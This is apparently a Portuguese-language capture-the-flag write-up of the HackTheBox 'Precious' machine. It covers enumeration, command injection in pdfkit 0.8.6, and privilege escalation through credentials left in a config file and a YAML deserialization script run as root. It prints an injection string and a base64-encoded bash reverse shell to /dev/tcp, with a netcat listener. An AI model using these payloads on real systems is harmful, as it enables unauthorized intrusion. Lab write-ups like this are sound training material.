Olá a todos! Meu primeiro write-up com uma máquina simples da HTB, esperem que gostem ;) Sem enrolação vamos pro CTF!

Enumeração - identificando Vulnerabilidade - Exploração - Escalação de Privilégios - Pós-exploração
-------------------------------------------------------------------------------------------------

1- Enumeração
----
Como de costume, verifico se no IP fornecido á algum endereço de URL para colocarmos em nossa lista /etc/hosts
. Adicionamos: precious.htb

Scan usando: *nmap* -v -sV -A -Pn -oN scanSimples 10.129.97.151 
```
-v:  mostrar os resultados em tempo real.  
-sV: mostrar versões dos serviços encontrados.
-A:  mais agressividade, trazendo assim informações extras, como detecção de (SO) detecção de versão, varredura de script e traceroute.
-Pn: desativar a descoberta de host.
-oN: salvar a saída em um arquivo.
```
![Screenshot_1](https://user-images.githubusercontent.com/120592559/208176107-bd3e31ff-0834-4908-9adc-d57eb625e52a.png)

*Porta 80*

![2](https://user-images.githubusercontent.com/120592559/208177876-abf19d48-f284-4cab-8ae5-2a1669ba2856.png)

A ideia do site e simples: colocar o endereço de qualquer outro site, e logo em seguida, ele convertera este site em PDF, alguns segundos depois um arquivo sera baixada em PDF.

![image](https://user-images.githubusercontent.com/120592559/208178439-3a368396-b667-493c-a555-e06b4b16004a.png)

Usando o comando *strings* nós deparamos com as strings deste documento.

![image](https://user-images.githubusercontent.com/120592559/208179268-a158c907-5a31-4461-88ae-1128d5d8aae4.png)

2- IDENTIFICANDO VULNERABILIDADE
-----------------------------
2- Como na foto anterior nós mostrávamos que este PDF este sendo processado pelo *pdfkit v0.8.6*. A uma vulnerabilidade de *Command Injection!*

![image](https://user-images.githubusercontent.com/120592559/208182258-85f43abf-46cd-4cde-8ec3-6a4c8c7f889b.png)

Explicação: Esta vulnerabilidade com o pdfkit v0.8.6 acontece quando a aplicação tentar renderizar uma *URL* que contém parâmetros de string na consulta. Ou seja, se colocarmos a URL e logo em seguida a string *'%20`sleep 5`'* com o comando *sleep 5*, o servidor respondera após 5 segundos.
POC: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

3- EXPLORAÇÃO
-------
Com isso já podemos pensar em nosso *Reverse-Shell*.
```
#OBS: A outras formas de se fazer isso.

1 - Primeiramente costumo abrir o Burp. 
2 - Logo em seguida, tive ajuda de um site para nós ajudarmos a montar nosso *Reverse-Shell* -- https://www.revshells.com/
3 - Abrir uma porta de escuta na máquina local: nc -nlvp 1113

```
Com o Reverse-Shell montado precisamos codificá-lo em *Base64*: https://www.base64encode.org/
`L2Jpbi9iYXNoIC1jICdzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEuMjAzLzExMTMgMD4mMSc=`

![image](https://user-images.githubusercontent.com/120592559/208185372-cb8b0e5b-b9a7-4dee-9ac5-595422d98bc8.png)

Conexão recebida:

![image](https://user-images.githubusercontent.com/120592559/208185579-274a92c8-20d1-4294-847f-7c14e46cb12c.png)

4-Escalação de privilégios
------
Procurando por arquivos, permissões, extensões, a uma pasta .blunde com um arquivo de configuração contendo as credenciais do usuário Henry

![image](https://user-images.githubusercontent.com/120592559/208186680-f8b4d393-2da2-4b43-a0ba-dd958f4e1db6.png)

Usaremos estás credenciais para entrar via SSH.

![image](https://user-images.githubusercontent.com/120592559/208186986-b9d0607d-993c-4122-8c04-03858866efe4.png)

5- Pós-exploração
---
*Permissões root* que o usuário Henry tem.
![image](https://user-images.githubusercontent.com/120592559/208187331-7998843b-b23d-4fa6-9021-ce81615232df.png)

Olhando o conteúdo do script:

![image](https://user-images.githubusercontent.com/120592559/208187438-a29da456-2dad-46a3-81dd-db899740be84.png)

OBS: Entendo pouco coisa de Ruby. Porém, e um script que verifica as versões dos pacotes, que estão referenciados no arquivo `dependencies.yml` .
Outro ponto a ser visto, e que ele busca o arquivo dependencies.yml em um caminho *relativo*. Podemos usar isto para forjar uma execução de comando mudando o ´PATH´. Para testarmos nossa teoria, criamos um arquivo chamado dependencies.yml no /tmp/. O conteúdo do arquivo: "test file .yml"

![image](https://user-images.githubusercontent.com/120592559/208241128-10634412-193a-4543-83ee-9c9aace41b14.png)

Exportamos o caminho PATH para /tmp 

![image](https://user-images.githubusercontent.com/120592559/208241184-fe352d69-bfe8-4da0-a1b0-47945cb00619.png)

Executando o arquivo, podemos observar que ele buscou e leu nosso arquivo. Ótimo! Agora pro #ROOT.
Procurando por algum artigo que nos diga como executar comandos em um arquivo .yml, me deparei com este script: https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565

![image](https://user-images.githubusercontent.com/120592559/208241462-f6b6e878-a43f-441c-bb1e-1fd7e2971d55.png)

Colocamos este conteúdo no arquivo e um comando para ser executado: `sh`

![image](https://user-images.githubusercontent.com/120592559/208241554-01e77c69-b852-48f4-96db-52dd61a2c002.png)

#ROOT!!

![image](https://user-images.githubusercontent.com/120592559/208241574-03c56c66-23d0-4d60-bfd7-33a7d2856ece.png)
![image](https://user-images.githubusercontent.com/120592559/208241589-a663e532-0e64-41a3-8851-d4d9404a68fd.png)

Obrigado por lerem ;) 

